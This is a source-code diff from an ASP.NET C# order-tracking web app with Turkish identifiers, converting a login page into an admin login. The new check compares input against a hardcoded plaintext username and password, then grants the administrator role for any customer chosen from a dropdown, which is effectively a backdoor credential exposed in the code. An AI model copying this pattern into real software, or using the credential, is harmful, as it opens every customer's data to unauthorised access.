@@ -8,21 +8,39 @@ using System.Web.Security;
 
 namespace KobsisSiparisTakip.Web
 {
-    public partial class Login : System.Web.UI.Page
+    public partial class AdminLogin : System.Web.UI.Page
     {
         protected void Page_Load(object sender, EventArgs e)
         {
             if (!Page.IsPostBack)
             {
                 SessionManager.CaptchaImageText = CaptchaImage.GenerateRandomCode(CaptchaType.AlphaNumeric, 6);
+                MusteriListesiYukle();
+            }
+        }
+
+        private void MusteriListesiYukle()
+        {
+            DataTable dt = new MusteriBS().MusteriListesiGetir();
+            if (dt.Rows.Count > 0)
+            {
+                ddlMusteri.DataSource = dt;
+                ddlMusteri.DataTextField = "Adi";
+                ddlMusteri.DataValueField = "MusteriID";
+                ddlMusteri.DataBind();
+            }
+            else
+            {
+                ddlMusteri.DataSource = null;
+                ddlMusteri.DataBind();
             }
         }
 
         protected void LB_Login_Click(object sender, EventArgs e)
         {
-            if (string.IsNullOrWhiteSpace(userName.Text) || string.IsNullOrWhiteSpace(password.Text))
+            if (string.IsNullOrWhiteSpace(userName.Text) || string.IsNullOrWhiteSpace(password.Text) || string.IsNullOrWhiteSpace(ddlMusteri.SelectedValue))
             {
-                MessageBox.Hata(this, "Kullanıcı adı ve şifre giriniz!");
+                MessageBox.Hata(this, "Kullanıcı adı, şifre girip, müşteri seçiniz!");
                 return;
             }
 
@@ -38,11 +56,9 @@ namespace KobsisSiparisTakip.Web
                 }
             }
 
-            Kullanici k = new KullaniciBS().KullaniciBilgisiGetir(userName.Text, password.Text);
-
-            if (k.KullaniciID.HasValue)
+            if (KullaniciKontrol())
             {
-                UserValid(k);
+                UserValid();
             }
             else
             {
@@ -55,10 +71,17 @@ namespace KobsisSiparisTakip.Web
             }
         }
 
-        private void UserValid(Kullanici k)
+        private void UserValid()
         {
-            Musteri m = new MusteriBS().MusteriBilgiGetirKullaniciAdinaGore(k.KullaniciID.Value);
+            Musteri m = new MusteriBS().MusteriBilgiGetirMusteriIDGore(Convert.ToInt32(ddlMusteri.SelectedValue));
             SessionManager.MusteriBilgi = m;
+            Kullanici k = new Kullanici()
+            {
+                KullaniciID = 0,
+                Rol = KullaniciRol.Yonetici,
+                MusteriID = m.MusteriID,
+                KullaniciAdi = "mangacece"
+            };
             SessionManager.KullaniciBilgi = k;
 
             SessionManager.Remove("LoginAttemptUser");
@@ -71,6 +94,14 @@ namespace KobsisSiparisTakip.Web
         {
             SessionManager.Clear();
             //FormsAuthenticationProvider.LogOut();
+        }
+
+        private bool KullaniciKontrol()
+        {
+            if (userName.Text == "mangacece" && password.Text == "1Qaz2wSx!")
+                return true;
+
+            return false;
         }
 
         private bool ResimKontroluYap()
